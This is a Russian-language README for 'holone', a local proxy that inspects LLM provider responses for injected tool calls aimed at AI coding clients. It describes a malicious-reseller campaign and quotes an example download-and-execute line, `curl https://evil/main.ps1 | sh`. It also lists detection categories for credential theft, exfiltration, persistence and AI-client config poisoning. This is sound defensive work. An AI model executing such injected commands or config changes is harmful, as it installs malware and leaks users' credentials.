<div align="center">

# holone

**локальный страж против вредоносных llm-провайдеров — независимо от клиента**

[![go](https://img.shields.io/badge/go-1.26%2B-00ADD8?logo=go&logoColor=white)](https://go.dev)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![platforms](https://img.shields.io/badge/platforms-windows%20%7C%20macos%20%7C%20linux-555)]()
[![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](CONTRIBUTING.md)

</div>

---

дешёвые перекупы «api claude/gpt» — известный канал доставки малвари. вредоносный
провайдер говорит на обычном протоколе anthropic/openai, но **подсовывает вызовы
инструментов прямо в ответ модели** — и твой ai-клиент (claude code, kilo code,
cline, cursor, aider…) послушно запускает `curl https://evil/main.ps1 | sh`,
ставит скрытую задачу в планировщике, гонит весь трафик через socks5-прокси и
затирает логи. это реальная кампания (`awstore.cloud` / `kiro.cheap`, целила
именно по пользователям снг).

`holone` стоит **на проводе**, а не внутри одного клиента — поэтому защищает любой
клиент сразу. ты направляешь base url клиента на holone, holone форвардит трафик
реальному провайдеру и проверяет ответ на инъекции.

```
   ai-клиент   ──►   holone proxy (инспектирует)   ──►   реальный провайдер
 (base url =                    │
 127.0.0.1:8787)                └──►  alert / block при инъекции tool_use
```

---

## что ловит — и что честно НЕ ловит

✅ **детектит и блокирует активные инъекции.** команды, которые провайдер
вшивает в ответ: загрузка-и-запуск, персистентность, подмена proxy/dns,
анти-форензика, смена локали, известные ioc — а с v0.2 ещё: отравление
конфигов ai-клиента (`.claude/settings.json`, `.mcp.json`, `CLAUDE.md`,
хуки `PreToolUse`), слив кредов (ssh-ключи, `~/.aws/credentials`,
`~/.kube/config`, `.env`, chrome stores), exfil к легитимным хостам
(discord / telegram / slack webhooks, dns-tunnel), evasion amsi / etw / clm,
git-атаки (`core.hooksPath`, `.git/hooks`, ci poisoning), macos / linux /
docker / wsl персистентность. работает с любым клиентом, где можно задать
свой base url.

✅ **палит непрошеные вызовы инструментов.** если в ответе есть `tool_use`, хотя
клиент не объявлял инструментов — это сильный признак инъекции, holone сам
поднимает его до high.

✅ **специфично для ai-клиентов: ловит отравление конфига.** главный слепой
пятак старых детекторов — провайдер заставляет клиента переписать свой
`.claude/settings.json` / `.mcp.json` / `CLAUDE.md`, внедряя хук, который
срабатывает на каждой следующей сессии. holone v0.2 палит именно это.

✅ **проверяет машину** на индикаторы заражения этих кампаний и умеет следить в
фоне.

✅ **сканирует эндпоинт провайдера** (canary-пробы + ioc/tls-проверки).

❌ **не детектит пассивный слив.** провайдер, который просто *читает* твои
промпты, выглядит как честный — на машине ничего не происходит, ловить нечего.
holone говорит об этом прямо. **не отправляй секреты неофициальным провайдерам и
меняй ключи, которыми уже с ними пользовался.**

---

## установка

**в одну строку** (качает бинарь из releases и кладёт в PATH):

```powershell
# windows (powershell)
irm https://raw.githubusercontent.com/vanndh/holone/main/scripts/install.ps1 | iex
```
```sh
# linux / macos
curl -fsSL https://raw.githubusercontent.com/vanndh/holone/main/scripts/install.sh | sh
```

**через go** (нужен go 1.26+):

```sh
go install github.com/vanndh/holone/cmd/holone@latest
```

**вручную:** скачай бинарь под свою ос со страницы [releases](../../releases),
положи в `PATH`, на unix — `chmod +x`. один статический файл, без зависимостей.

**из исходников:**

```sh
git clone https://github.com/vanndh/holone && cd holone
go build -o holone ./cmd/holone
# кросс-сборка, например:
GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -o holone ./cmd/holone
```

> 💡 да, установка через `curl … | sh` / `irm … | iex` — это ровно тот паттерн,
> который holone ловит. ирония намеренная; скрипты короткие, прочитай их перед
> запуском (как и любой установщик), они лежат в [`scripts/`](scripts/).

---

## быстрый старт

```sh
# 1) поднимаем holone перед провайдером
holone proxy --upstream https://api-cc.freemodel.dev

# 2) направляем клиент на holone вместо провайдера:
#    ANTHROPIC_BASE_URL=http://127.0.0.1:8787   (claude code и пр.)
#    либо настройка «base url» / «openai-совместимый эндпоинт» в клиенте

# 3) работаем как обычно. holone печатает alert и пишет в ~/.holone/holone.log,
#    когда провайдер что-то подсовывает.
```

пример алерта (провайдер попытался вшить загрузку-и-запуск):

```
ALERT 2026-06-21T08:25:53Z [anthropic] rules: dl-curl-pipe-sh ioc-domain proto-tooluse-unsolicited
```

### настройка по клиентам

| клиент | как направить на holone |
| --- | --- |
| claude code | `export ANTHROPIC_BASE_URL=http://127.0.0.1:8787` (или в `~/.claude/settings.json`) |
| cline / roo / kilo code | base url провайдера → `http://127.0.0.1:8787` |
| cursor | settings → models → переопредели base url anthropic/openai |
| aider | `--openai-api-base http://127.0.0.1:8787` (или `OPENAI_API_BASE`) |

твой api-ключ всё так же уходит реальному провайдеру — holone пробрасывает его
нетронутым и **никогда** не пишет в лог.

---

## команды

### `holone proxy` — инспекция трафика на проводе

```sh
holone proxy --upstream <url-провайдера> [--listen 127.0.0.1:8787] [--mode monitor|block]
```

| | `monitor` (по умолчанию) | `block` |
| --- | --- | --- |
| вредоносный `tool_use` | **доходит** до клиента | **вырезается**, заменяется заглушкой |
| реакция | только alert + лог | alert + лог + правка ответа |
| латентность | ~0 (инспекция вне горячего пути) | ~0 для текста; задержка лишь на подозрительном `tool_use` |
| чистый текст | не трогается | не трогается |

флаги: `--log <файл|->` (jsonl-лог, по умолчанию `~/.holone/holone.log`),
`--rules <файл>` / `--blocklist <файл>` — заменить встроенные правила.

### `holone scan` — canary-проба провайдера

```sh
holone scan https://api-cc.freemodel.dev --key $ANTHROPIC_API_KEY
```

шлёт промпт, которому **не** нужны инструменты, и палит любой `tool_use` в ответе;
прогоняет правила по выводу; сверяет домен/ip с блоклистом; смотрит tls-сертификат;
печатает risk-score и вердикт. чистый результат **не** доказывает безопасность —
см. честную оговорку выше.

### `holone audit` — разовая проверка машины

```sh
holone audit
```

ищет индикаторы кампании: левые процессы (`awproxy.exe`, `tun2socks`…), задачи
персистентности (`CodeAssist`, `StartupOptimizer`), дроп-пути
(`%LOCALAPPDATA%\Microsoft\SngCache`), соединения с публичным socks-эндпоинтом
или known-bad ip, подозрительные proxy-переменные.

### `holone sentinel` — фоновый мониторинг

```sh
holone sentinel --interval 30s
```

перепрогоняет аудит по интервалу и алертит, как только появляется новый индикатор.

---

## как работает детект

- **поведенческие правила** (`rules/rules.json`): re2-регэкспы по категориям
  (download-exec, obfuscation, persistence, network, anti-forensics, locale,
  client-config, credential-theft, exfil, git-attack). гоняются по собранному
  вводу инструмента / аргументам вызова / тексту ответа.
- **ioc-блоклист** (`rules/blocklist.json`): известные плохие домены, ip, пути,
  имена задач и процессов.
- **аномалия протокола**: вызов инструмента без объявленных клиентом инструментов
  = инъекция.

оба файла встроены в бинарь (`go:embed`), так что он самодостаточен, и оба можно
переопределить в рантайме. **новые правила и ioc приветствуются** — см.
[CONTRIBUTING.md](CONTRIBUTING.md).

---

## известные нюансы

- **пассивный слив не детектится** (повторюсь, это важно) — структурное решение
  одно: не гонять секреты через недоверенных провайдеров.
- **block-режим может резать легитимный security-контент.** если ты работаешь
  *над* кодом, где законно встречаются `curl|sh`, `certutil`, `schtasks` (например,
  пишешь сам детектор), block-режим вырежет такие `tool_use`. для такой работы
  используй `monitor`. _(да, holone однажды заблокировал собственный коммит —
  лучший догфудинг.)_
- отличить шум от атаки просто: в логе смотри `source` (`text` = модель просто
  пишет про опасное; `tool_use:…` = реальный вызов) и флаг `proto-tooluse-unsolicited`.

---

## структура проекта

```
cmd/holone            cli (proxy | scan | audit | sentinel)
internal/proxy        инспектирующий реверс-прокси (anthropic + openai sse)
internal/inspect      движок детекта (регэкспы + ioc)
internal/scanner      canary-сканер эндпоинта
internal/sentinel     ос-проверки ioc (windows + posix)
internal/mockevil     тестовая заглушка: фейковый вредоносный провайдер
rules/                встроенные rules.json + blocklist.json
```

## тесты

```sh
go test ./...                                  # юниты + интеграция (прокси vs mockevil)
go test -run '^$' -bench . ./internal/...       # бенчмарки латентности / детекта
go run ./mockevil &                             # фейковый вредоносный провайдер для ручного e2e
holone proxy --upstream http://127.0.0.1:9999
curl -N -d '{"messages":[]}' 'http://127.0.0.1:8787/v1/messages?profile=evil'
```

---

## дисклеймер

holone — это вспомогательная защита, а не гарантия. он снижает, но не убирает риск
маршрутизации трафика через недоверенного llm-провайдера. самый безопасный вариант
по-прежнему — официальный эндпоинт. лицензия mit.
